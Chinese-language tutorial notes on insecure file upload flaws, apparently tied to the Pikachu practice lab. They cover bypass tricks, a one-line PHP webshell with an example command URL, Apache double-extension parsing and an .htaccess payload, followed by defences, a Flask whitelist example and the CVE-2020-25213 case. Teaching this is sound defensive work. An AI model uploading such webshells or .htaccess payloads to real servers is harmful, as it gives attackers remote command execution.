# 不安全的文件上传 (Unsafe File Upload)

## 原理

文件上传漏洞发生在应用程序允许用户上传文件，但没有严格验证文件类型和内容。攻击者可以上传恶意文件（如 WebShell），从而获得服务器控制权。

根本原因：**只依赖于客户端验证或简单的 MIME 类型检查，没有在服务端做充分校验**。

## 常见绕过方式

| 检查方式 | 绕过方法 |
|----------|----------|
| 前端 JS 检查扩展名 | 直接抓包修改请求，或者禁用 JS |
| 仅检查 Content-Type | 抓包将 `Content-Type: image/jpeg` 改成需要的 |
| 仅检查文件头 Magic Number | 在恶意代码前加上正常文件的文件头（如 GIF89a） |
| 黑名单扩展名 | 尝试 `.php5`、`.phtml`、`.php3`、`.php4`、`.shtml` |
| 检查文件尺寸 | 只要改小文件即可 |

## 示例

### 上传 WebShell

```php
<?php
// webshell.php — 上传后即可远程执行命令
system($_GET['cmd']);
?>
```

上传后用浏览器访问 `http://target.com/uploads/webshell.php?cmd=whoami`

### Apache 解析漏洞

上传文件名为 `shell.php.jpg`，在某些 Apache 版本中：
- 先从右向左解析扩展名
- `.jpg` 不认识 → 继续看 `.php` → 按 PHP 执行

### .htaccess 攻击

如果允许上传 `.htaccess` 文件，可以：

```
# 将所有 .jpg 文件当作 PHP 执行
AddType application/x-httpd-php .jpg
```

然后上传包含 PHP 代码的 `shell.jpg` → 可以当作 PHP 执行。

## 防御

| 防御措施 | 说明 | 强度 |
|----------|------|------|
| 白名单扩展名 | 只允许 `.jpg`、`.png`、`.gif` | ✅ 强 |
| 文件内容检查 | 使用 `getimagesize()` 验证图片有效性 | ✅ 强 |
| 重命名文件 | 不使用用户提供的文件名，服务器随机生成 | ✅ 强 |
| 限制目录权限 | 上传目录禁止执行脚本 | ✅ 强 |
| 单独域名存储 | 上传文件放在不同域名下，隔离风险 | ✅ 推荐 |

### 安全代码示例（Python + Flask）

```python
import os
from werkzeug.utils import secure_filename

ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/upload', methods=['POST'])
def upload_file():
    file = request.files['file']
    if file and allowed_file(file.filename):
        # 重命名文件（防解析漏洞）
        ext = file.filename.rsplit('.', 1)[1].lower()
        new_name = uuid.uuid4().hex + '.' + ext
        file.save(os.path.join(UPLOAD_FOLDER, new_name))
        return '上传成功'
    return '不支持的文件类型'
```

## 真实案例

### 案例：WordPress 插件 File Manager 漏洞（CVE-2020-25213）
- 漏洞：上传功能未限制文件类型，攻击者可上传 PHP 文件
- 影响：超过 70 万个网站受影响
- 后果：攻击者可以上传 WebShell 控制服务器

## 在 Pikachu 靶场中的对应模块

Pikachu 提供了 Client Check（客户端检查绕过）、MIME Type（MIME 类型绕过）、getimagesize（图片文件头检查绕过）三个练习场景。
